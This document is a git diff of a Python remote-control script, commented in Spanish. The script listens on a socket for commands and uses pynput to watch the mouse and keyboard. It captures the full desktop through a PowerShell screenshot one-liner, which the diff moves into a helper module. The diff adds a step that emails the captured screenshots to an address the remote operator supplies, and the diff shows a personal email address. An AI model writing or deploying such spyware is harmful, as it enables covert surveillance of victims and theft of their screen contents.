@@ -2,19 +2,23 @@ import socket
 from pynput import mouse,keyboard
 import subprocess
 import threading
+import options
 import signal, sys
 from rich import print
+
 
 def def_handler(sig, frame):
     print ("\n Saliendo del Programa....")
     sys.exit(1)
 signal.signal(signal.SIGINT, def_handler)
 
+option = options
 
 # Proceso Aparte Corriendo en un Hilo
 
 def image():
-    data = subprocess.run("powershell [void][reflection.assembly]::loadwithpartialname('system.windows.forms'); $MyScreenshot = [System.Windows.Forms.SystemInformation]::VirtualScreen; $WID = $MyScreenshot.Width; $HEI = $MyScreenshot.Height; $LEFT = $MyScreenshot.Left; $TOP = $MyScreenshot.Top; $MyBitmap = New-Object System.Drawing.Bitmap $WID, $HEI ;$MyDrawing = [System.Drawing.Graphics]::FromImage($MyBitmap); $MyDrawing.CopyFromScreen($LEFT, $TOP, 0, 0, $MyBitmap.Size); $MyFile = $env:TMP+'\{}.png' ; $MyBitmap.Save($MyFile) ".format("caca"))
+    path_image = option.capture_image("screenshot_desktop")
+    option.send_image(path_image)
 
 def key_press(key):
     if key == keyboard.Key.ctrl_l:
@@ -58,12 +62,18 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                             2) Enviar Data (Posicion del Mouse)
                             3) Cerrar la Script
                 ''')
-            elif data_client == "exit" or   data_client == "x":
+            elif data_client == "exit" or   data_client == "x" or data_client == "3" or data_client == "close":
+                conexion.send(b'''
+                        Cerrando Script
+                ''')
                 sys.exit(1)
             elif data_client == "1":
                 conexion.send(b"Menu about Image:")
-                imagen_name = conexion.recv(1024).decode("utf-8")
-                data = subprocess.run("powershell [void][reflection.assembly]::loadwithpartialname('system.windows.forms'); $MyScreenshot = [System.Windows.Forms.SystemInformation]::VirtualScreen; $WID = $MyScreenshot.Width; $HEI = $MyScreenshot.Height; $LEFT = $MyScreenshot.Left; $TOP = $MyScreenshot.Top; $MyBitmap = New-Object System.Drawing.Bitmap $WID, $HEI ;$MyDrawing = [System.Drawing.Graphics]::FromImage($MyBitmap); $MyDrawing.CopyFromScreen($LEFT, $TOP, 0, 0, $MyBitmap.Size); $MyFile = $env:TMP+'\{}.png' ; $MyBitmap.Save($MyFile) ".format(imagen_name))
+                image_name = conexion.recv(1024).decode("utf-8")
+                conexion.send(b"Email: (juanmapipa4@gmail.com)")
+                email = conexion.recv(1024).decode("utf-8")
+                path_image = option.capture_image(image_name)
+                option.send_image(path_image, email)
                 conexion.send(b"Captura Sacada...")
                 data_client = " "
 
